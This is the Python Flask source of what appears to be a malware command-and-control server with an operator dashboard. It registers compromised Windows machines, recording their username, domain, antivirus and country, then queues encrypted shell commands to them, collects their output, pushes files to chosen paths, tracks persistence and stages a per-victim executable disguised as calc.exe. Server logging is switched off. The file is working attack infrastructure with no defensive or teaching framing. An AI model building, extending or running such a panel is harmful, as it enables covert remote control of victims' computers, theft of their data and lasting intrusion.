import hashlib
import json
import logging
import os
import random
from datetime import datetime
from functools import wraps
from pathlib import Path
from threading import Lock

import ipaddress
import pycountry
import requests
from flask import Flask, Response, abort, flash, jsonify, redirect, render_template, request, session, stream_with_context, url_for
from flask_socketio import SocketIO
from werkzeug.middleware.proxy_fix import ProxyFix
from werkzeug.utils import secure_filename
import os.path

import db_sqllite as dbs
from encryptions import decrypt_string, enc_string

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1)
app.secret_key = os.getenv("FLASK_SECRET_KEY", "change-this-in-production")
socketio = SocketIO(app, async_mode="threading", cors_allowed_origins="*")

log = logging.getLogger("werkzeug")
log.disabled = True
app.logger.disabled = True

DOWNLOAD_FOLDER = "downloads"
UPLOAD_FOLDER = "uploads"
UPLOAD_CANCEL_LOCK = Lock()
UPLOAD_CANCELED = set()

def _new_captcha():
    a = random.randint(1, 9)
    b = random.randint(1, 9)
    session["captcha_answer"] = str(a + b)
    return f"{a} + {b} = ?"

def format_time_diff(seconds):
 
    if seconds < 0:
        return "N/A"
    elif seconds < 60:
        return f"{seconds:.1f}s"
    elif seconds < 3600:  
        minutes = seconds / 60
        return f"{minutes:.1f}m"
    elif seconds < 86400: 
        hours = seconds / 3600
        return f"{hours:.1f}h"
    else:  
        days = seconds / 86400
        return f"{days:.1f}d"

def login_required(view_func):
    @wraps(view_func)
    def wrapped(*args, **kwargs):
        if not session.get("is_authenticated"):
            return redirect(url_for("login"))
        return view_func(*args, **kwargs)

    return wrapped


def build_hash(username, computer):
    raw = f"{username}{computer}"
    return hashlib.sha256(raw.encode()).digest()


def get_country_from_ip(ip):
    try:
        ip_obj = ipaddress.ip_address(ip)
        if ip_obj.is_private:
            return "Internal"

        resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=5)
        data = resp.json()
        country_code = data.get("country")
        if not country_code:
            return "Unknown"
        country = pycountry.countries.get(alpha_2=country_code)
        return country.name if country else "Unknown"
    except Exception:
        return "Unknown"


def _safe_path(base_folder, filename):
    base_path = os.path.abspath(base_folder)
    candidate = os.path.abspath(os.path.join(base_folder, filename))
    if candidate != base_path and not candidate.startswith(base_path + os.sep):
        return None
    return candidate


def _mark_upload_canceled(filename):
    if not filename:
        return
    with UPLOAD_CANCEL_LOCK:
        UPLOAD_CANCELED.add(str(filename))


def _clear_upload_canceled(filename):
    if not filename:
        return
    with UPLOAD_CANCEL_LOCK:
        UPLOAD_CANCELED.discard(str(filename))


def _is_upload_canceled(filename):
    if not filename:
        return False
    with UPLOAD_CANCEL_LOCK:
        return str(filename) in UPLOAD_CANCELED


def _stream_file(path, filename, cancel_key=None, client_id=None):
    file_size = os.path.getsize(path)
    chunk_size = 1_000_000
    sent_bytes = 0

    def generate():
        nonlocal sent_bytes
        canceled = False
        with open(path, "rb") as f:
            while True:
                if cancel_key and _is_upload_canceled(cancel_key):
                    canceled = True
                    break
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                sent_bytes += len(chunk)
                if cancel_key:
                    progress = int((sent_bytes * 100) / file_size)
                    payload = {
                        "filename": filename,
                        "progress": progress,
                        "status": "uploading",
                    }
                    if client_id is not None:
                        payload["client_id"] = str(client_id)
                    socketio.emit("upload_progress", payload)
                yield chunk

        if cancel_key:
            if canceled:
                payload = {
                    "filename": filename,
                    "progress": 0  ,
                    "status": "canceled" ,
                }
                if client_id is not None:
                    payload["client_id"] = str(client_id)
                socketio.emit("upload_progress", payload)

    return Response(
        stream_with_context(generate()),
        mimetype="application/octet-stream",
        headers={
            "Content-Disposition": f"attachment; filename={filename}",
            "Content-Length": str(file_size),
        },
    )


def _extract_upload_filename(queued_value):
    if not queued_value:
        return None
    raw = str(queued_value)
    if "," in raw:
        return raw.split(",", 1)[0]
    return raw


def _clients_snapshot():
    clients = dbs.Client.select().order_by(dbs.Client.ID.desc())
    clients_data = []
    for client in clients:
        clients_data.append(
            {
                "id": client.ID,
                "username": client.Username or "-",
                "ip": client.ip or "-",
                "country": client.country or "-",
                "last_seen": client.last_seen.isoformat() if client.last_seen else None,
                "domain": client.Domain or "-",
                "os": client.Windows or "-",
                "sleep": client.sleep or "-",
                "last_result": client.last_result or "",
                "persist": client.persist or "-",
                
            }
        )
    return {"clients": clients_data, "timestamp": datetime.now().isoformat()}


def _dashboard_broadcast_loop():
    while True:
        socketio.emit("dashboard_update", _clients_snapshot())
        socketio.sleep(3)


@socketio.on("connect")
def _on_connect():
    if not session.get("is_authenticated"):
        return False
    socketio.emit("dashboard_update", _clients_snapshot())


@app.route("/uploads_list")
@login_required
def uploads_list():
    try:
        files = []
        if os.path.exists(UPLOAD_FOLDER):
            for filename in os.listdir(UPLOAD_FOLDER):
                filepath = os.path.join(UPLOAD_FOLDER, filename)
                if os.path.isfile(filepath):
                    files.append({
                        'name': filename,
                        'size': os.path.getsize(filepath)
                    })
        return jsonify({"files": files})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/uploads_local", methods=["POST"])
@login_required
def upload_local_file():
    uploaded = request.files.get("upload_file_local")
    if not uploaded or not uploaded.filename:
        flash("Please choose a file to upload.", "error")
        return redirect(url_for("dashboard"))

    filename = secure_filename(uploaded.filename)
    if not filename:
        flash("Invalid filename.", "error")
        return redirect(url_for("dashboard"))

    try:
        Path(UPLOAD_FOLDER).mkdir(parents=True, exist_ok=True)
        destination = Path(UPLOAD_FOLDER) / filename
        if destination.exists():
            stem = destination.stem
            suffix = destination.suffix
            index = 1
            while destination.exists():
                destination = Path(UPLOAD_FOLDER) / f"{stem}_{index}{suffix}"
                index += 1
        uploaded.save(str(destination))
        flash(f"Uploaded to uploads/{destination.name}.", "ok")
    except Exception as e:
        flash(f"Upload failed: {str(e)}", "error")
    return redirect(url_for("dashboard"))


@app.route("/upload_progress", methods=["POST"])
@login_required
def upload_progress():
    client_id = request.form.get("client_id")
    action = request.form.get("action", "uploads").strip().lower()
    
    if not client_id:
        return jsonify({"error": "Client ID required."}), 400
    
    client = dbs.Client.get_or_none(dbs.Client.ID == client_id)
    if not client:
        return jsonify({"error": "Client not found."}), 404
    
    filename = request.form.get("upload_file")
    target_path = request.form.get("target_path")
    
    if not filename or not target_path:
        return jsonify({"error": "File and target path required."}), 400
    
    # Check if file exists
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    if not os.path.exists(filepath) or not os.path.isfile(filepath):
        return jsonify({"error": f"File '{filename}' not found in uploads folder."}), 404

    _clear_upload_canceled(filename)
    
    if action not in ("upload", "uploads"):
        action = "uploads"

    client.command = action
    client.persistfile = f"{filename},{target_path}"
    client.save()
    
    # Emit progress start event
    socketio.emit(
        "upload_progress",
        {
            "client_id": client_id,
            "filename": filename,
            "progress": 0,
            "status": "queued",
        },
    )

    return jsonify({"ok": True}), 200


@app.route("/cancel_upload", methods=["POST"])
@login_required
def cancel_upload():
    try:
        client_id = request.form.get("client_id")
        if not client_id:
            data = request.get_json(silent=True) or {}
            client_id = data.get("client_id") or data.get("ID")

        if not client_id:
            return jsonify({"error": "Client ID required."}), 400

        client = dbs.Client.get_or_none(dbs.Client.ID == client_id)
        if not client:
            return jsonify({"error": "Client not found."}), 404

        filename = request.form.get("upload_file")
        if not filename:
            data = request.get_json(silent=True) or {}
            filename = data.get("upload_file") or data.get("filename")
        if not filename:
            filename = _extract_upload_filename(client.persistfile)

        _mark_upload_canceled(filename)

        client.command = "0"
        client.persistfile = "0"

        stamp = datetime.now().strftime("%H:%M:%S")
        cancel_note = f"[{stamp}] upload canceled by operator."
        prev = client.last_result or ""
        if prev and not prev.endswith(("\n", "\r")):
            client.last_result = f"{prev}\n{cancel_note}"
        elif prev:
            client.last_result = f"{prev}{cancel_note}"
        else:
            client.last_result = cancel_note
        client.save()

        socketio.emit(
            "upload_progress",
            {
                "client_id": str(client_id),
                "filename": filename,
                "progress": 0,
                "status": "canceled",
            },
        )
        socketio.emit(
            "result_update",
            {"client_id": str(client_id), "last_result": client.last_result},
        )
        socketio.emit(
            "toast",
            {"type": "ok", "message": f"Upload canceled for client {client_id}."},
        )
        return jsonify({"ok": True}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/login", methods=["GET", "POST"])
def login():
    if session.get("is_authenticated"):
        return redirect(url_for("dashboard"))

    captcha_question = session.get("captcha_question") or _new_captcha()
    session["captcha_question"] = captcha_question

    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "").strip()
        captcha = request.form.get("captcha", "").strip()

        expected_user = os.getenv("PANEL_USERNAME", "admin_me")
        expected_pass = os.getenv("PANEL_PASSWORD", "admin123_me")

        if captcha != session.get("captcha_answer"):
            flash("Captcha is incorrect.", "error")
            session["captcha_question"] = _new_captcha()
            return render_template("login.html", captcha=session["captcha_question"])

        if username != expected_user or password != expected_pass:
            flash("Username or password is incorrect.", "error")
            session["captcha_question"] = _new_captcha()
            return render_template("login.html", captcha=session["captcha_question"])

        session["is_authenticated"] = True
        session.pop("captcha_answer", None)
        session.pop("captcha_question", None)
        return redirect(url_for("dashboard"))

    return render_template("login.html", captcha=captcha_question)


@app.route("/logout", methods=["POST"])
@login_required
def logout():
    session.clear()
    return redirect(url_for("login"))


@app.route("/", methods=["GET"])
@login_required
def dashboard():
    clients = dbs.Client.select().order_by(dbs.Client.ID.desc())
    return render_template("dashboard.html", clients=clients, now=datetime.now())


@app.route("/clients/<int:client_id>/action", methods=["POST"])
@login_required
def client_action(client_id):
    client = dbs.Client.get_or_none(dbs.Client.ID == client_id)
    if not client:
        flash("Client not found.", "error")
        return redirect(url_for("dashboard"))

    action = request.form.get("action", "").strip().lower()

    if action == "delete":
        client.command = "exit!!"
        client.save()
        flash(f"Delete queued for client {client_id}.", "ok")
        return redirect(url_for("dashboard"))

    if action == "sleep":
        value = request.form.get("sleep_value", "").strip()
        try:
            sleep_seconds = int(value)
            if sleep_seconds < 1:
                raise ValueError
        except ValueError:
            flash("Sleep must be a positive number.", "error")
            return redirect(url_for("dashboard"))
        client.command = "sleep"
        client.persistfile = str(sleep_seconds)
        client.sleep = str(sleep_seconds)
        client.save()
        flash(f"Sleep updated for client {client_id}.", "ok")
        return redirect(url_for("dashboard"))

    if action == "cmd":
        cmd_text = request.form.get("cmd_value", "").strip()
        if not cmd_text:
            flash("Command cannot be empty.", "error")
            return redirect(url_for("dashboard"))
        client.command = "cmd"
        client.persistfile = enc_string(cmd_text)
        client.save()
        flash(f"Command queued for client {client_id}.", "ok")
        return redirect(url_for("dashboard"))

    if action == "upload":
        local_file = request.form.get("upload_file", "").strip()
        target_path = request.form.get("upload_target", "").strip()
        source = os.path.join(UPLOAD_FOLDER, local_file)
        if not local_file or not target_path or not os.path.isfile(source):
            flash("Upload file/target is invalid.", "error")
            return redirect(url_for("dashboard"))
        client.command = "uploads"
        client.persistfile = f"{local_file},{target_path}"
        client.save()
        flash(f"Upload queued for client {client_id}.", "ok")
        return redirect(url_for("dashboard"))

    if action == "stage":
        source_name = "calc.exe"
        source = os.path.join(DOWNLOAD_FOLDER, source_name)
        if not os.path.isfile(source):
            flash("downloads/calc.exe not found.", "error")
            return redirect(url_for("dashboard"))

        with open(source, "rb") as f:
            data = f.read()

        hash_bytes = build_hash(client.Username or "", client.Computer or "")
        if len(data) >= len(hash_bytes):
            original_data = data[:-len(hash_bytes)]
        else:
            original_data = data

        new_name = f"calc{client_id}.exe"
        with open(os.path.join(DOWNLOAD_FOLDER, new_name), "wb") as f:
            f.write(original_data + hash_bytes)

        client.command = "upload"
        client.persistfile = new_name
        client.save()
        flash(f"Stage queued for client {client_id}.", "ok")
        return redirect(url_for("dashboard"))

    flash("Unknown action.", "error")
    return redirect(url_for("dashboard"))


@app.route("/uploads/<path:filename>")
def upload_file(filename):
    safe_path = _safe_path(UPLOAD_FOLDER, filename)
    if not safe_path:
        abort(403)
    if not os.path.exists(safe_path) or not os.path.isfile(safe_path):
        abort(404)
    client_id = request.args.get("client_id") or request.args.get("ID")
    return _stream_file(safe_path, filename, cancel_key=filename, client_id=client_id)


@app.route("/download/<path:filename>")
def download_file(filename):
    safe_path = _safe_path(DOWNLOAD_FOLDER, filename)
    if not safe_path:
        abort(403)
    if not os.path.exists(safe_path) or not os.path.isfile(safe_path):
        abort(404)
    return _stream_file(safe_path, filename)


@app.route("/heartbeat", methods=["POST"])
def heartbeat():
    try:
        data = request.get_json()
        client_id = data.get("ID")

        if client_id is None or client_id == "":
            return jsonify({"error": "ID required"}), 400

        client = dbs.Client.get_or_none(dbs.Client.ID == client_id)
        if not client:
            return jsonify({"error": "id not found"}), 404
        
        client.last_seen = datetime.now()
        client.save()

        if client.command == "exit!!":
            exit_code = client.command
            client.delete_instance()
            return jsonify({"ok": exit_code}), 200
        if client.command == "uploads":
            queued = client.persistfile or "0"
            filename = _extract_upload_filename(queued)
            socketio.emit(
                "upload_progress",
                {
                    "client_id": str(client_id),
                    "filename": filename,
                    "progress": 1,
                    "status": "uploading",
                },
            )
            client.persistfile = "0"
            client.command = "0"
            client.save()
            return jsonify({"uploads": queued}), 200
        if client.command == "cmd":
            queued = client.persistfile or "0"
            client.persistfile = "0"
            client.command = "0"
            client.save()
            return jsonify({"cmd": queued}), 200
        if client.command == "sleep":
            queued = client.persistfile or "0"
            client.persistfile = "0"
            client.command = "0"
            client.save()
            return jsonify({"sleep": queued}), 200
        
        queued = client.persistfile or "0"
        client.persistfile = "0"
        client.command = "0"
        client.save()
        return jsonify({"ok": queued}), 200
    except Exception as e:
        return jsonify({"error": f"error on heartbeat: {str(e)}"}), 500


@app.route("/result", methods=["POST"])
def result():
    try:
        data = request.get_json()
        client_id = data.get("ID")

        if client_id is None or client_id == "":
            return jsonify({"error": "ID required"}), 400

        client = dbs.Client.get_or_none(dbs.Client.ID == client_id)
        if not client:
            return jsonify({"error": "id not found"}), 404

        raw_result = data.get("result")
        try:
            incoming_result = decrypt_string(raw_result) if raw_result else ""
            
        except Exception:
            incoming_result = ""
        existing_result = client.last_result or ""
       
        

        # Some agents send full accumulated output, others send incremental chunks.
        # Merge both safely so dashboard keeps a complete terminal log.
        if not existing_result:
            merged_result = incoming_result
        elif incoming_result == existing_result:
            merged_result = existing_result
        elif incoming_result.startswith(existing_result):
            merged_result = incoming_result
        else:
            needs_sep = (
                existing_result
                and not existing_result.endswith(("\n", "\r"))
                and incoming_result
            )
            merged_result = (
                f"{existing_result}\n{incoming_result}"
                if needs_sep
                else f"{existing_result}{incoming_result}"
            )

        client.last_seen = datetime.now()
        client.last_result = merged_result
        client.save()
        socketio.emit(
            "result_update",
            {
                "client_id": str(client_id),
                "last_result": merged_result,
            },
        )
        return jsonify({"ok": "0"}), 200
    except Exception as e:
        
        return jsonify({"error": f"error on result: {str(e)}"}), 500


@app.route("/finish", methods=["POST"])
def finish():
    try:
        data = request.get_json()
        client_id = data.get("ID")

        if client_id is None or client_id == "":
            return jsonify({"error": "ID required"}), 400

        client = dbs.Client.get_or_none(dbs.Client.ID == client_id)
        if not client:
            return jsonify({"error": "id not found"}), 404
        socketio.emit(
            "toast",
            {"type": "ok", "message": f"Persisted for client {client_id}."},
        )

        client.last_seen = datetime.now()
        client.persist = "1"
        client.save()
        return jsonify({"ok": "1"}), 200
    except Exception as e:
        return jsonify({"error": f"error on finish: {str(e)}"}), 500


@app.route("/finish_upload", methods=["POST"])
def finish_upload():
    try:
        data = request.get_json(silent=True) or {}
        client_id = (
            data.get("ID")
            or data.get("id")
            or data.get("client_id")
            or request.form.get("ID")
            or request.form.get("id")
            or request.form.get("client_id")
            or request.args.get("ID")
            or request.args.get("id")
            or request.args.get("client_id")
        )

        if client_id is None or client_id == "":
            return jsonify({"error": "ID required"}), 400

        client = dbs.Client.get_or_none(dbs.Client.ID == client_id)
        if not client:
            return jsonify({"error": "id not found"}), 404
        

        filename = (
            data.get("filename")
            or data.get("upload_file")
            or request.form.get("filename")
            or request.form.get("upload_file")
            or request.args.get("filename")
            or request.args.get("upload_file")
            or _extract_upload_filename(client.persistfile)
        )
        _clear_upload_canceled(filename)
            
        if data.get("Status") == "ok" :
            socketio.emit(
            "toast",
            {"type": "ok", "message": f"Upload finished for client {client_id}."},
            )
            socketio.emit(
                "upload_progress",
                {
                    "client_id": str(client_id),
                    "filename": filename,
                    "progress": 100,
                    "status": "completed",
                },
            )

            client.last_seen = datetime.now()
            client.persistfile = "0"
            client.save()
            return jsonify({"ok": "1"}), 200
        else:
            socketio.emit(
                "upload_progress",
                {
                    "client_id": str(client_id),
                    "filename": filename,
                    "progress": -1,
                    "status": "error",
                },
            )

            client.last_seen = datetime.now()
            client.persistfile = "0"
            client.save()
            return jsonify({"ok": "0"}), 200
    except Exception as e:
        return jsonify({"error": f"error on finish_upload: {str(e)}"}), 500


@app.route("/register", methods=["POST"])
def register_client():
    try:
        data = json.loads(request.data.decode("utf-8"))
        client_id = data.get("ID")

        if client_id is None:
            return jsonify({"error": "ID required"}), 400

        username = decrypt_string(data.get("Username"))
        domain = decrypt_string(data.get("Domain"))
        computer = decrypt_string(data.get("Computer"))

        existing_client = (
            dbs.Client.select()
            .where(
                (dbs.Client.Username == username)
                & (dbs.Client.Domain == domain)
                & (dbs.Client.Computer == computer)
            )
            .first()
        )

        if existing_client:
            client = existing_client
            client.last_seen = datetime.now()
            client.ip = request.remote_addr
            client.country = get_country_from_ip(request.remote_addr)
            client.save()
        else:
            client = dbs.Client.create(
                Username=username,
                Domain=domain,
                Av=decrypt_string(data.get("Av")),
                Windows=decrypt_string(data.get("Windows")),
                Computer=computer,
                last_seen=datetime.now(),
                ip=request.remote_addr,
                country=get_country_from_ip(request.remote_addr),
                persist="0",
            )

        return jsonify({"id": client.ID}), 200
    except Exception as e:
        return jsonify({"error": f"error on register: {str(e)}"}), 500


if __name__ == "__main__":
    Path(DOWNLOAD_FOLDER).mkdir(parents=True, exist_ok=True)
    Path(UPLOAD_FOLDER).mkdir(parents=True, exist_ok=True)
    dbs.initial_db()
    socketio.start_background_task(_dashboard_broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
